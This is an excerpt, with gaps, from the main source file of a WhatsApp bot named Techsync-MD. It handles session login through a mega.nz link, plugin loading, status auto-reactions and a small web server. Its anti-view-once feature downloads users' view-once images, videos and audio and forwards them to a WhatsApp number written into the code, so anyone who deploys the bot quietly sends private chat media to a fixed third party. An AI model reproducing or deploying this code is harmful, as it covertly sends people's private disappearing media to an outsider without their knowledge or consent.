const {
  ...
  const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
    const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./Techsync/data')
  const fs = require('fs')
  const ff = require('fluent-ffmpeg')
  const P = require('pino')
  const config = require('./config')
  const qrcode = require('qrcode-terminal')
  const rankCommand = require('./Techsync/plugins/rank')
  ...
  //===================SESSION-AUTH============================
if (!fs.existsSync(__dirname + '/Techsync/sessions/creds.json')) {
if(!config.SESSION_ID) return console.log('Please add your session to SESSION_ID env !!')
const sessdata = config.SESSION_ID.replace("Techsync-MD~", '');
const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
filer.download((err, data) => {
if(err) throw err
fs.writeFile(__dirname + '/Techsync/sessions/creds.json', data, () => {
console.log("Session downloaded Successfully ✅")
  ...
  const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/Techsync/sessions/')
  ...
  require("./Techsync/plugins/" + plugin);
  }
  });
...
*ᴛᴇᴄʜ𝐬ʏɴᴄ ᴛʜᴇ ʙᴇsᴛ ʙᴏᴛ ɪɴ ᴛʜᴇ ᴡᴏʀʟᴅ ᴄᴏᴅᴇᴅ ʙʏ ᴍᴠᴇʟᴀsᴇ ᴛᴇᴄʜɴᴏʟᴏɢʏ*
...
if (config.AUTO_STATUS_REACT === "true") {
  ...
  if (malvinik && config.ANTI_VV === "true") {
    ...
    return conn.sendMessage("263717777643@s.whatsapp.net", { image: { url: anu }, caption: cap }, { quoted: mek });
    ...
    return conn.sendMessage("263717777643@s.whatsapp.net", { video: { url: anu }, caption: cap }, { quoted: mek });
  } if (malvinik.message.audioMessage) {
    let anu = await conn.downloadAndSaveMediaMessage(malvinik.message.audioMessage);
    return conn.sendMessage("263717777643@s.whatsapp.net", { audio: { url: anu }, caption: cap }, { quoted: mek });
  }
  }
...
if (!isReact && senderNumber === botNumber) {
  ...
  app.get("/", (req, res) => {
  res.send("Hello There Techsync Is Now Running ✅️");
  });
